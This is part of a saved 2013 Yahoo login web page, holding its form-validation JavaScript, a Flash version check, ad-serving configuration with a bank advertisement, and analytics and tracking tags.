    var id = document.getElementById(toCheck['username']);
    var pw = document.getElementById(toCheck['password']);
    var pwVal = pw.value;
    if (!id) {
        if (pwVal == '') {
             YAHOO.util.Event.preventDefault(e);
             pw.focus();
             YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
             YAHOO.membership.showError('<strong>Please enter your password</strong>');
        }
    } else {
        if (id.value === "e.g. john_smith1656") {
            id.value = "";
        }
        var idVal = id.value;
        if (pwVal == '' && idVal == ''){
            YAHOO.util.Event.preventDefault(e);
            YAHOO.util.Dom.setStyle(pw, 'background-color', '#ffefef');
            YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
            YAHOO.membership.showError('<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.');
            id.focus();
          }else if(pwVal == '' && idVal != ''){
            YAHOO.util.Event.preventDefault(e);
            pw.focus();
            YAHOO.util.Dom.setStyle(id, 'background-color', '');
            YAHOO.util.Dom.setStyle(pw, 'background-color', '#ffefef');
            YAHOO.membership.showError('<strong>Please enter your password</strong>');
          }else if(pwVal != '' && idVal == ''){
            YAHOO.util.Event.preventDefault(e);
            id.focus();
            YAHOO.util.Dom.setStyle(id, 'background-color', '#ffefef');
            YAHOO.util.Dom.setStyle(pw, 'background-color', '');
            YAHOO.membership.showError('<strong>Please verify your Yahoo! ID</strong>');
          } else {
		    			makerequest();
		    		  }
    }
}

/**
 * 3PA - General Manual Bind Screen - "No, thanks" CTA
 */
YAHOO.membership.noThanks = function (e) {
    YAHOO.util.Event.preventDefault(e);
    window.location.href = "";
};

/**
 * 3PA - General Manual Bind Screen - "Recover your Id" & "Recover your password" CTA
 */
YAHOO.membership.recoverPwd = function (e) {
    YAHOO.util.Event.preventDefault(e);
    document.domain = "yahoo.com";
    if (typeof window.opener != 'undefined') {
        window.opener.location.href = "";
    } else {
        window.location.href = "";
    }
};

/**
 * 3PA - General Manual Bind Screen - default username manipulation when user clicks
 */
YAHOO.membership.removeUsername = function (e) {
    if (this.value === "e.g. john_smith1656") {
        YAHOO.util.Dom.setStyle(this.id, "color", "#666666");
        this.value = "";
    }
 };      
 
YAHOO.membership.blurUsername = function (e) {
    if (this.value === "") {
        this.value = "e.g. john_smith1656";
        YAHOO.util.Dom.setStyle(this.id, "color", "#cccccc");
    }
    else if (this.value !== "e.g. john_smith1656") {
        YAHOO.util.Dom.setStyle(this.id, "color", "#666666");
    }
};


		YAHOO.util.Event.addListener('.save', 'click', YAHOO.membership.checkInputs, {'username':'username', 'password':'passwd'});
if(typeof YAHOO=="undefined"){YAHOO={};}
var Y = YAHOO;
Y.doUpgradeCheck = function(){
  var plugin, activex, version, params = [];

  if (navigator.plugins && navigator.plugins.length > 0) {
      plugin = navigator.plugins['Shockwave Flash 2.0'] ||
               navigator.plugins['Shockwave Flash'];

      if (plugin && plugin.description) {
          version = plugin.description.replace(/([a-zA-Z]|\s)+/, '').replace(/(\s+r|\s+b[0-9]+)/, '.').split('.');
      }
  } else {
      try {
          activex = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.7');
          version = activex.GetVariable('\$version').split(' ')[1].split(',');
      } catch (e1) {
          try {
              activex = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.6');
              version = [6, 0, 21];
              activex.AllowScriptAccess = 'always';
              version = activex.GetVariable('\$version').split(' ')[1].split(',');
          } catch (e2) {}
      }
  }

  if(version){
      var major = parseInt(version[0], 10);
      var minorA = parseInt(version[1], 10);
      var minorB = parseInt(version[2], 10);
      var strVersion = major + "." + minorA + "." + minorB;

      if(major >= 10){
        //ok
      }else if(major == 9){
        if(minorA == 0 && minorB < 28){
          Y.showUpgradeCTA(strVersion);
        }
      }else if(major == 8){
        if(minorA == 0 && minorB < 34){
          Y.showUpgradeCTA(strVersion);
        }
      }else if(major == 7){
        if(minorA == 0 && minorB < 69){
          Y.showUpgradeCTA(strVersion);
        }
      }else{
        Y.showUpgradeCTA(strVersion);
      }
    }

}
Y.showUpgradeCTA = function(version){
  try{
    var fun = document.getElementById('fun');
    var imgUrl = "https://s.yimg.com/lq/i/nt/ic/ut/bsc/cautionmetro16_1.gif";
    var beaconUrl = 'https://login.yahoo.com/i/flashUp/ft.gif' + '?v=' + version + '&intl=' + 'us';
    fun.innerHTML = "<img id='caution' src='" + imgUrl + "'><span class='b'>Security Alert:</span> <span class='n'><a href='http://help.yahoo.com/l/us/yahoo/security/account_security/adobe-flash.html' tabindex='999' target='_blank'>Protect</a> your account. <a href='http://get.adobe.com/flashplayer/' tabindex='999' target='_blank'>Upgrade your Adobe Flash Player.</a><img src='" + beaconUrl + "' height='1' width='1'></span>";
    fun.style.paddingBottom = '12px';
    fun.style.display = 'block';
  }catch(e){}
}

if(window.addEventListener){
window.addEventListener("load", Y.doUpgradeCheck, false);
}else{
window.attachEvent("onload", Y.doUpgradeCheck);
}

</script>

<!--[if IE 6]>
<script type='text/javascript'>
YAHOO.namespace('ads');
YAHOO.ads.positionFooter = function() {
    Dom.setStyle("footer", "position", "absolute");
    var top = Dom.getViewportHeight() + Dom.getDocumentScrollTop() - 35;
    Dom.setStyle("footer", "top", top + "px");
}
window.setInterval(YAHOO.ads.positionFooter, 500);
</script>
<![endif]-->



<script>


document.domain = "yahoo.com";
if (!window.opener) {
    var Dom = YAHOO.util.Dom;
    var Event = YAHOO.util.Event;
    var winProps = "menubar=0,location=1,resizable=1,scrollbars=1,status=1,toolbar=0,width=650,height=500";
    Event.on("fBtn","click", function(t) {
        Event.preventDefault(t);
        window.open(fbSigninLnk, "fb", winProps);   
    });
    Event.on("gBtn","click", function(t) {
        Event.preventDefault(t);
        window.open(googSigninLnk, "go", winProps);
    });   
}
</script>



                <div style="display:none">

                    <script type='text/javascript' src='https://s.yimg.com/rq/darla/2-4-4/js/darla-secure-pre-fb-min.js'></script>
                    <script type="text/plain" id="fc" _ver="2-4-4">{ positions: [ { html: "<!--Static sales ad--> \n<!--Vendor: Yahoo, Format: Login Ad - Static, Name: Login Ad-->\n<style>\nhtml {background-color:#fff;}\nbody,div,p,a {margin:0;padding:0;}\n#richad *{outline:none;user-select:none;-moz-user-select:none;-khtml-user-select:none;}\n.offscrn{clip:rect(0 0 0 0);position:absolute;top:0;left:0;margin:0;padding:0;font-size:.1em;}\n\n#adlinks {position:relative;width:400px;margin:0 auto;font:11px arial;z-index:100;}\n#adlinks p {position:absolute;text-align:right;right:90px;top:15px;}\n#adlinks,#adlinks a {color:#999;}\n#adlinks a {margin:0 5px;text-decoration:none;}\n.can_ad_slug{padding:0px 15px 0px 0px;background:url('https://s.yimg.com/lq/lib/can_interstitial/icons/adchoice_1.4.png') no-repeat right;}\n\n#richad{height:1024px;width:1440px;overflow:hidden;position:relative;margin:0 auto;background-repeat:no-repeat;background-position:center top;}\n.hotspot{position:absolute;display:block;z-index:10;outline:none;}\n.hotspot img {display:block;}\n\n#hotspot5{left:1121px;top:0px;}	\n#hotspot6{left:1px;top:35px;}	\n#hotspot7{left:882px;top:486px;}	\n\n#hotspot_main{z-index:9;width:400px;margin:0 auto;position:relative;}\n#hotspot_main .hotspot{position:absolute;right:95px;top:40px;}\n\n</style>\n<h1 class=\"offscrn\">ADVERTISEMENT: GT Banks - Mail Login</h1>\n\n<div id=\"richad\">\n\n<a href=\"https://clicks.beap.bc.yahoo.com/yc/YnY9MS4wLjAmYnM9KDE2YWw5dW9vZChnaWQkeXpIVkoyS0w3YUxUODZya1VTaTRKZ0xuS1lxNjRsSFRFdVlBQ3RnbSxzdCQxMzcyNzg3NDMwNzMzNDM3LHNpJDQ0NjU1NTEsc3AkMTUwMDAyNTI3LGNyJDI2MjIzMzcwMzIsdiQyLjAsYWlkJFpGUzBSR0tMRi5BLSxjdCQyNSx5YngkRmlzZkZ3R0EuWjhTalQ2aG1vS2x5dyxiaSQxNDQxNzcwMzIsciQwLGlkJGhvdHNwb3Q1LHJkJDE5cXRtdTQ5OCkp/0/*http://global.ard.yahoo.com/SIG=15kpd8srj/M=999999.999999.999999.999999/D=yahoo/S=150002527:RICH/Y=YAHOO/EXP=1372794630/L=yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm/B=ZFS0RGKLF.A-/J=1372787430786708/K=GcPLey7rUHb9PiAGB_maHQ/A=2350665803715614045/R=0/X=6/id=hotspot5/SIG=12gsrlsro/*http://www.gtbank.com/personalbanking/cards/mastercard/gtbank-naira-mastercard\" target=\"_blank\" class=\"hotspot\" id=\"hotspot5\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"1019\" width=\"314\" border=\"0\" alt=\"Click For: GT Banks\" /></a>\n<a href=\"https://clicks.beap.bc.yahoo.com/yc/YnY9MS4wLjAmYnM9KDE2YW1hNWhsZyhnaWQkeXpIVkoyS0w3YUxUODZya1VTaTRKZ0xuS1lxNjRsSFRFdVlBQ3RnbSxzdCQxMzcyNzg3NDMwNzMzNDM3LHNpJDQ0NjU1NTEsc3AkMTUwMDAyNTI3LGNyJDI2MjIzMzcwMzIsdiQyLjAsYWlkJFpGUzBSR0tMRi5BLSxjdCQyNSx5YngkRmlzZkZ3R0EuWjhTalQ2aG1vS2x5dyxiaSQxNDQxNzcwMzIsciQxLGlkJGhvdHNwb3Q2LHJkJDE5cWNsMzNkMikp/0/*http://global.ard.yahoo.com/SIG=15kpd8srj/M=999999.999999.999999.999999/D=yahoo/S=150002527:RICH/Y=YAHOO/EXP=1372794630/L=yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm/B=ZFS0RGKLF.A-/J=1372787430786708/K=GcPLey7rUHb9PiAGB_maHQ/A=2350665803715614045/R=1/X=6/id=hotspot6/SIG=12gsrlsro/*http://www.gtbank.com/personalbanking/cards/mastercard/gtbank-naira-mastercard\" target=\"_blank\" class=\"hotspot\" id=\"hotspot6\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"984\" width=\"878\" border=\"0\" alt=\"Click For: GT Banks\" /></a>\n<a href=\"https://clicks.beap.bc.yahoo.com/yc/YnY9MS4wLjAmYnM9KDE2YXB1dGRyMyhnaWQkeXpIVkoyS0w3YUxUODZya1VTaTRKZ0xuS1lxNjRsSFRFdVlBQ3RnbSxzdCQxMzcyNzg3NDMwNzMzNDM3LHNpJDQ0NjU1NTEsc3AkMTUwMDAyNTI3LGNyJDI2MjIzMzcwMzIsdiQyLjAsYWlkJFpGUzBSR0tMRi5BLSxjdCQyNSx5YngkRmlzZkZ3R0EuWjhTalQ2aG1vS2x5dyxiaSQxNDQxNzcwMzIsciQyLGlkJGhvdHNwb3Q3LHJkJDE5cWtnN2I5aSkp/0/*http://global.ard.yahoo.com/SIG=15kpd8srj/M=999999.999999.999999.999999/D=yahoo/S=150002527:RICH/Y=YAHOO/EXP=1372794630/L=yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm/B=ZFS0RGKLF.A-/J=1372787430786708/K=GcPLey7rUHb9PiAGB_maHQ/A=2350665803715614045/R=2/X=6/id=hotspot7/SIG=12gsrlsro/*http://www.gtbank.com/personalbanking/cards/mastercard/gtbank-naira-mastercard\" target=\"_blank\" class=\"hotspot\" id=\"hotspot7\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"533\" width=\"236\" border=\"0\" alt=\"Click For: GT Banks\" /></a>\n\n\n<div id=\"hotspot_main\"><a href=\"https://clicks.beap.bc.yahoo.com/yc/YnY9MS4wLjAmYnM9KDE2ZWs1ZmpqMihnaWQkeXpIVkoyS0w3YUxUODZya1VTaTRKZ0xuS1lxNjRsSFRFdVlBQ3RnbSxzdCQxMzcyNzg3NDMwNzMzNDM3LHNpJDQ0NjU1NTEsc3AkMTUwMDAyNTI3LGNyJDI2MjIzMzcwMzIsdiQyLjAsYWlkJFpGUzBSR0tMRi5BLSxjdCQyNSx5YngkRmlzZkZ3R0EuWjhTalQ2aG1vS2x5dyxiaSQxNDQxNzcwMzIsciQzLGlkJHdwX21haW40NTBiZyxyZCQxOXVtaHNpdWwpKQ/2/*http://global.ard.yahoo.com/SIG=15kpd8srj/M=999999.999999.999999.999999/D=yahoo/S=150002527:RICH/Y=YAHOO/EXP=1372794630/L=yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm/B=ZFS0RGKLF.A-/J=1372787430786708/K=GcPLey7rUHb9PiAGB_maHQ/A=2350665803715614045/R=3/X=6/id=wp_main450bg/SIG=12gsrlsro/*http://www.gtbank.com/personalbanking/cards/mastercard/gtbank-naira-mastercard\" target=\"_blank\" class=\"hotspot\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"450\" width=\"450\" border=\"0\" alt=\"\" /></a></div>\n\n\n</div>\n\n<scr"+"ipt>\nfunction addEvent(obj,axn,fxn){if(window.attachEvent)obj.attachEvent(\"on\"+axn,fxn);else obj.addEventListener(axn,fxn,0);}\nfunction adTRK(t){if(t){var i=new Image;i.onload=function(){};i.src=t;}}\nfunction ad_init() {\n	document.getElementById(\"richad\").style.backgroundImage = \"url(https://s.yimg.com/cv/ae/xa/audience/130701/1440x1024uiuzwwyd4.jpg)\"; \n		}\naddEvent(window,\"load\", function(){setTimeout(ad_init,1);});\n</scr"+"ipt>\n<!-- https://clicks.beap.bc.yahoo.com/yc/YnY9MS4wLjAmYnM9KDE1dW81MWU3OShnaWQkeXpIVkoyS0w3YUxUODZya1VTaTRKZ0xuS1lxNjRsSFRFdVlBQ3RnbSxzdCQxMzcyNzg3NDMwNzMzNDM3LHNpJDQ0NjU1NTEsc3AkMTUwMDAyNTI3LGNyJDI2MjIzMzcwMzIsdiQyLjAsYWlkJFpGUzBSR0tMRi5BLSxjdCQyNSx5YngkRmlzZkZ3R0EuWjhTalQ2aG1vS2x5dyxiaSQxNDQxNzcwMzIsciQ0LHJkJDE2aTBtY2FrNikp/0/*http://global.ard.yahoo.com/SIG=15kpd8srj/M=999999.999999.999999.999999/D=yahoo/S=150002527:RICH/Y=YAHOO/EXP=1372794630/L=yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm/B=ZFS0RGKLF.A-/J=1372787430786708/K=GcPLey7rUHb9PiAGB_maHQ/A=2350665803715614045/R=4/X=6/* --><!--QYZ 144177032,2622337032,98.139.227.230;;RICH;150002527;1;-->", id: "RICH", meta: { y: { cscHTML: "", behavior: "non_exp", adID: "2350665803715614045", matchID: "999999.999999.999999.999999", err: "", hasExternal: 0, size: "1440x1024", bookID: "144177032", serveType: "-1", slotID: "2" } } } ], meta: { y: { pageEndHTML: "", pos_list: [ "FOOT","FOOT9","RICH" ], spaceID: "150002527", host: "login.yahoo.com", lookupTime: "65", k2_uri: "", fac_rt: "60769" } } } </script><script language=javascript>
if(window.xzq_d==null)window.xzq_d=new Object();
window.xzq_d['ZFS0RGKLF.A-']='(as$12q8mhv40,aid$ZFS0RGKLF.A-,bi$144177032,cr$2622337032,ct$25,at$H,eob$-1)';
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135arh39l(gid$yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm,st$1372787430733437,si$4465551,sp$150002527,pv$1,v$2.0))&t=J_3-D_3&al=(as$12q8mhv40,aid$ZFS0RGKLF.A-,bi$144177032,cr$2622337032,ct$25,at$H,eob$-1)"></noscript><script language=javascript>
if(window.xzq_d==null)window.xzq_d=new Object();
window.xzq_d['jBS0RGKLF.A-']='(as$125jvtsbl,aid$jBS0RGKLF.A-,cr$-1,ct$25,at$H,eob$-1)';
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135arh39l(gid$yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm,st$1372787430733437,si$4465551,sp$150002527,pv$1,v$2.0))&t=J_3-D_3&al=(as$125jvtsbl,aid$jBS0RGKLF.A-,cr$-1,ct$25,at$H,eob$-1)"></noscript><script language=javascript>
(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i=new Array();T.xzq_i.c=0}var R=T.xzq_i;R[++R.c]=new Image();R[R.c].src=S}window.xzq_sr=function(){var S=window;var Y=S.xzq_d;if(Y==null){return }if(J==null){return }var T=J+M;if(T.length>P){C();return }var X="";var U=0;var W=Math.random();var V=(Y.hasOwnProperty!=null);var R;for(R in Y){if(typeof Y[R]=="string"){if(V&&!Y.hasOwnProperty(R)){continue}if(T.length+X.length+Y[R].length<=P){X+=Y[R]}else{if(T.length+Y[R].length>P){}else{U++;N(T,X,U,W);X=Y[R]}}}}if(U){U++}N(T,X,U,W);C()};function N(R,U,S,T){if(U.length>0){R+="&al="}F(R+U+"&s="+S+"&r="+T)}function C(){window.xzq_d=null;M=null;J=null}function K(R){xzq_sr()}function B(R){xzq_sr()}function L(U,V,W){if(W){var R=W.toString();var T=U;var Y=R.match(new RegExp("\\\\(([^\\\\)]*)\\\\)"));Y=(Y[1].length>0?Y[1]:"e");T=T.replace(new RegExp("\\\\([^\\\\)]*\\\\)","g"),"("+Y+")");if(R.indexOf(T)<0){var X=R.indexOf("{");if(X>0){R=R.substring(X,R.length)}else{return W}R=R.replace(new RegExp("([^a-zA-Z0-9$_])this([^a-zA-Z0-9$_])","g"),"$1xzq_this$2");var Z=T+";var rv = f( "+Y+",this);";var S="{var a0 = '"+Y+"';var ofb = '"+escape(R)+"' ;var f = new Function( a0, 'xzq_this', unescape(ofb));"+Z+"return rv;}";return new Function(Y,S)}else{return W}}return V}window.xzq_eh=function(){if(E||I){this.onload=L("xzq_onload(e)",K,this.onload,0);if(E&&typeof (this.onbeforeunload)!=O){this.onbeforeunload=L("xzq_dobeforeunload(e)",B,this.onbeforeunload,0)}}};window.xzq_s=function(){setTimeout("xzq_sr()",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var G=navigator.userAgent;var A=parseInt(H);var D=Q.indexOf("Microsoft");var E=D!=-1&&A>=4;var I=(Q.indexOf("Netscape")!=-1||Q.indexOf("Opera")!=-1)&&A>=4;var O="undefined";var P=2000})();
</script><script language=javascript>
if(window.xzq_svr)xzq_svr('https://csc.beap.bc.yahoo.com/');
if(window.xzq_p)xzq_p('yi?bv=1.0.0&bs=(135arh39l(gid$yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm,st$1372787430733437,si$4465551,sp$150002527,pv$1,v$2.0))&t=J_3-D_3');
if(window.xzq_s)xzq_s();
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135arh39l(gid$yzHVJ2KL7aLT86rkUSi4JgLnKYq64lHTEuYACtgm,st$1372787430733437,si$4465551,sp$150002527,pv$1,v$2.0))&t=J_3-D_3"></noscript>
                </div>
                <script type="text/javascript">
                    var DARLA_CONFIG = {servicePath:'https://login.yahoo.com/darla/php/fc.php', beaconPath:'https://login.yahoo.com/darla/php/b.php', renderPath:'https://login.yahoo.com/darla/2-4-4/html/ext-render.html', srenderPath:'https://s.yimg.com/rq/darla/2-4-4/html/ext-render-secure.html', sfbrenderPath:'https://s.yimg.com/rq/darla/2-4-4/html/ext-render-fb-secure.html', msgPath:'https://login.yahoo.com/darla/2-4-4/html/ext-msg.html',	cscPath:'https://s.yimg.com/rq/darla/2-4-4/html/csc-render.html',	version:'2-4-4', root:'darla', edgeRoot:'http://l.yimg.com/rq/darla/2-4-4', sedgeRoot:'https://s.yimg.com/rq/darla/2-4-4', tpbURI:''};;

                    function handle_render_timeout()
                    {
                        try {
                            DARLA.render.RenderMgr.nuke();
                        } catch (e) {  }

                        try{
                            var el;

                            el = document.getElementById("iframeHolder");
                            if (el) el.innerHTML = "";

                            el = document.getElementById("static");
                            if (el) el.style.display = "block";
                        } catch (e) {  }
                    }

                    if (window.DARLA && window.DARLA_CONFIG) {
                
                        DARLA_CONFIG.positions =
                        {
                            "RICH":
                            {
                                clean: "iframeHolder",
                                dest:  "adFrame",
                                w:      1920,
                                h:      1024,
                                noexp:  1,      //forces ad content to not use rich api (you want this)
                                css:    "#fc_align { width:100%;min-width:1920px;margin-left:auto;margin-right:auto;display:inline-block;text-align:center; }" //sets up centering
                            }
                        };
                        
                        DARLA_CONFIG.onFailure  = function()
                        {
                            handle_render_timeout();
                        }
                
                        DARLA_CONFIG.onTimeout  = function()
                        {
                            handle_render_timeout();
                        }
                
                        DARLA_CONFIG.onSuccess  = function()
                        {
                            loadTime = new Date().getTime();
                        };
                
                        if (DARLA.config(DARLA_CONFIG) == "OK") {
                            setTimeout(DARLA.render,1);
                            window.darlaStartTime = new Date().getTime();
                        }
                    }
                </script><script language="JavaScript">
    
function checkBrowser(){
    var appName = navigator.appName;
    if( appName == "Microsoft Internet Explorer" )
    {
        // this only works in IE 5 for windows and higher ...
        if( navigator.appVersion.indexOf("Windows") == -1 )
            return -1;
        var appVersionAry = navigator.appVersion.split("(");
        if( appVersionAry.length < 2 )
            return -1;
        var appVersion = appVersionAry[1];
        appVersionAry = appVersion.split("; ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        appVersionAry = appVersion.split(" ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        var appVersionNumber = parseInt(appVersion);

        if( appVersionNumber < 5 )
            return -1;
    }
    else
    {
        return -1;
    }
}


</script>


<script language="JavaScript">


function flashCacheReady (initialized){ //invoked directly by Flash
    }
</script>





<!-- spaceid: 150002527 INT.OFFSET: 0 --><!-- SpaceID=150002527 loc=FOOT9 noad --><!-- fac-gd2-noad --><!-- gd2-status-2 --><!--QYZ CMS_NONE_AVAIL,,98.139.227.230;;FOOT9;150002527;2;--><!-- login.yahoo.com Tue Jul 2 10:50:30 PDT 2013 --><!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({
    c1: "2",
    c2: "7241469",
    c5: "150002527",
    c7: "https%3A%2F%2Flogin.yahoo.com%3A443%2Fconfig%2Flogin%3F.intl%3Dus%26amp%3B.lang%3Den-US%26amp%3B.partner%3D%26amp%3B.last%3D%26amp%3B.src%3Dym%26amp%3B.pd%3Dym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D%26amp%3Bpkg%3D%26amp%3Bstepid%3D%26amp%3B.done%3Dhttp%253a%2F%2Fmail.yahoo.com" 
  });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = "https://s.yimg.com/lq/lib/3pm/cs_0.2.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=7241469&c4=https%3A%2F%2Flogin.yahoo.com%3A443%2Fconfig%2Flogin%3F.intl%3Dus%26amp%3B.lang%3Den-US%26amp%3B.partner%3D%26amp%3B.last%3D%26amp%3B.src%3Dym%26amp%3B.pd%3Dym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D%26amp%3Bpkg%3D%26amp%3Bstepid%3D%26amp%3B.done%3Dhttp%253a%2F%2Fmail.yahoo.com&c5=150002527&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

</body>
</html>

<!-- l69.member.bf1.yahoo.com compressed/chunked Tue Jul  2 10:50:30 PDT 2013 -->
